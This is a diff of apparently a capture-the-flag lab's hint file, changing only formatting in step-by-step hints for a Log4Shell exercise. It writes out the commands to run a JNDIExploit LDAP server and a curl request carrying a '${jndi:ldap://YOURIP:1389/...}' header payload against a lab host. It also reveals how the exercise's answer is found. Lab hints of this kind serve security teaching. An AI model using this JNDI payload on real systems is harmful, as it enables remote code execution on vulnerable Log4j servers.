@@ -4,26 +4,22 @@
 
 To find your IP address, you can run many commands in the Linux terminal. Maybe there’s some way to use the hostname command to get what you want?
 
-If you’re having trouble with JNDIExploit, maybe try looking at the <code>-h</code> flag?
+If you’re having trouble with JNDIExploit, maybe try looking at the "-h" flag?
 
 ### HINT 2
 
-<code>hostname -I</code> will give you your private IP address.
+"hostname -I" will give you your private IP address.
 
-<code>java –jar JNDIExploit-1.2-SNAPSHOT.jar -i PRIVATEIPADDRESS</code> will start the server properly.
+"java –jar JNDIExploit-1.2-SNAPSHOT.jar -i PRIVATEIPADDRESS" will start the server properly.
 
 Triple-check to make sure you’re using that IP address.
 
-The answer is the <i>whole last line</i> from the Terminal window where you first ran the JNDIExploit program. Punctuation and all.
+The answer is the whole last line from the Terminal Emulator window where you first ran the JNDIExploit program. Punctuation and all.
 
 ### HINT 3
 
 1. Open a Terminal Emulator window
-
-2. Run <code>hostname -I</code> to get your ip address
-
-3. Run <code>java –jar JNDIExploit-1.2-SNAPSHOT.jar -i YOURIP</code>
-
-4. Open another window and run <code>curl http://sudosingles-optimizer -H 'X-Api-Version: ${jndi:ldap://YOURIP:1389/Basic/SpringEcho}'</code>
-
-5. If you are successful, you should see a line that looks like the following show up in your original terminal window: <code>[+] Response code: 200</code>
+2. Run "hostname -I" to get your ip address
+3. Run "java –jar JNDIExploit-1.2-SNAPSHOT.jar -i YOURIP"
+4. Open another window and run "curl http://sudosingles-optimizer -H 'X-Api-Version: ${jndi:ldap://YOURIP:1389/Basic/SpringEcho}'"
+5. If you are successful, you should see a line that looks like the following show up in your original terminal window: "[+] Response code: 200"
